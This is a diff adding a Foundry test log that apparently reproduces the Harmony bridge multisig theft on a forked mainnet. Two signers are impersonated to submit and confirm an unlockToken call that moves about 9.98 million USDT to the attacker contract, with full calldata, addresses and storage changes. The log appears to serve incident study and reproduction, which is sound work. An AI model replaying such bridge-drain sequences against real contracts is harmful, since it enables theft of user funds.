@@ -1,0 +1,74 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Harmony_multisig_exp.sol:ContractTest
+[PASS] testExploit() (gas: 388813)
+Logs:
+  USDT balance of attacker before Exploit: 0
+  How many approval required:: 2
+  2 of 5 multisig wallet, transaction first signed by:: 0xf845A7ee8477AD1FB4446651E548901a2635A915
+  2 of 5 multisig wallet, transaction second signed by:: 0x812d8622C6F3c45959439e7ede3C580dA06f8f25
+  USDT balance of attacker after Exploit: 9981000000000
+
+Traces:
+  [5845] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 15012645 [1.501e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [388813] ContractTest::testExploit()
+    ├─ [5031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "USDT balance of attacker before Exploit", val: 0)
+    ├─ [2386] MultiSigWallet::required() [staticcall]
+    │   └─ ← [Return] 2
+    ├─ emit log_named_uint(key: "How many approval required:", val: 2)
+    ├─ [0] VM::prank(0xf845A7ee8477AD1FB4446651E548901a2635A915)
+    │   └─ ← [Return]
+    ├─ [214072] MultiSigWallet::submitTransaction(ERC20EthManager: [0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857], 0, 0xfe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000913e1f5a2000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6)
+    │   ├─ emit Submission(transactionId: 21107 [2.11e4])
+    │   ├─ emit Confirmation(sender: 0xf845A7ee8477AD1FB4446651E548901a2635A915, transactionId: 21107 [2.11e4])
+    │   ├─  storage changes:
+    │   │   @ 0xbfa79b744eba99e62413e18df583fe31a0abf5a9fb692624ab085240270fde3b: 0 → 0x0000000000000000000000002dccdb493827e15a5dc8f8b72147e6c4a5620857
+    │   │   @ 0xf48a8bf6200e3c8a3b170f57963917d6a94959959dec9b51738c12ad06fe0d57: 0 → 0x3d831ec700000000000000000000000000000000000000000000000000000913
+    │   │   @ 0xf48a8bf6200e3c8a3b170f57963917d6a94959959dec9b51738c12ad06fe0d58: 0 → 0xe1f5a2000000000000000000000000007fa9385be102ac3eac297483dd6233d6
+    │   │   @ 0xf48a8bf6200e3c8a3b170f57963917d6a94959959dec9b51738c12ad06fe0d5a: 0 → 0xef5479b600000000000000000000000000000000000000000000000000000000
+    │   │   @ 0xf48a8bf6200e3c8a3b170f57963917d6a94959959dec9b51738c12ad06fe0d56: 0 → 0xfe7f61ea000000000000000000000000dac17f958d2ee523a2206206994597c1
+    │   │   @ 0xbfa79b744eba99e62413e18df583fe31a0abf5a9fb692624ab085240270fde3d: 0 → 265
+    │   │   @ 0xf48a8bf6200e3c8a3b170f57963917d6a94959959dec9b51738c12ad06fe0d59: 0 → 0x2b3e1496d48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99
+    │   │   @ 5: 21107 → 21108
+    │   │   @ 0xbc67090cb7f1b17d0630004df30684e0f945bc5cee8aafdde757f186e1f5928a: 0 → 1
+    │   └─ ← [Return] 21107 [2.11e4]
+    ├─ [4642] MultiSigWallet::getConfirmations(21107 [2.11e4]) [staticcall]
+    │   └─ ← [Return] [0xf845A7ee8477AD1FB4446651E548901a2635A915]
+    ├─ emit log_named_address(key: "2 of 5 multisig wallet, transaction first signed by:", val: 0xf845A7ee8477AD1FB4446651E548901a2635A915)
+    ├─ [0] VM::prank(0x812d8622C6F3c45959439e7ede3C580dA06f8f25)
+    │   └─ ← [Return]
+    ├─ [119094] MultiSigWallet::confirmTransaction(21107 [2.11e4])
+    │   ├─ emit Confirmation(sender: 0x812d8622C6F3c45959439e7ede3C580dA06f8f25, transactionId: 21107 [2.11e4])
+    │   ├─ [65510] ERC20EthManager::unlockToken(TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 9981000000000 [9.981e12], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xd48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6)
+    │   │   ├─ [37601] TetherToken::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9981000000000 [9.981e12])
+    │   │   │   ├─ emit Transfer(from: ERC20EthManager: [0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9981000000000 [9.981e12])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5aa3b141e373f792aa211d92854c10f381d5976c270abf7f4388cde7137201c9: 0x00000000000000000000000000000000000000000000000000000913ffbbedb4 → 0x000000000000000000000000000000000000000000000000000000001dc64bb4
+    │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x00000000000000000000000000000000000000000000000000000913e1f5a200
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Unlocked(ethToken: TetherToken: [0xdAC17F958D2ee523a2206206994597C13D831ec7], amount: 9981000000000 [9.981e12], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], receiptId: 0xd48d952695ede26c0ac11a6028ab1be6059e9d104b55208931a84e99ef5479b6)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x56d16955ae1843ececdb43d205027e50ebc0cadb6a3b24acf55040d057c8ddea: 0 → 1
+    │   │   └─ ← [Stop]
+    │   ├─ emit Execution(transactionId: 21107 [2.11e4])
+    │   ├─  storage changes:
+    │   │   @ 0xbfa79b744eba99e62413e18df583fe31a0abf5a9fb692624ab085240270fde3e: 0 → 1
+    │   │   @ 0x0488a9569b11eb4ef00c1275a2dee6aed6742494bf747248a23f3e17ffeea859: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [5356] MultiSigWallet::getConfirmations(21107 [2.11e4]) [staticcall]
+    │   └─ ← [Return] [0xf845A7ee8477AD1FB4446651E548901a2635A915, 0x812d8622C6F3c45959439e7ede3C580dA06f8f25]
+    ├─ emit log_named_address(key: "2 of 5 multisig wallet, transaction second signed by:", val: 0x812d8622C6F3c45959439e7ede3C580dA06f8f25)
+    ├─ [1031] TetherToken::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 9981000000000 [9.981e12]
+    ├─ emit log_named_uint(key: "USDT balance of attacker after Exploit", val: 9981000000000 [9.981e12])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.40s (8.08s CPU time)
+
+Ran 1 test suite in 11.02s (9.40s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
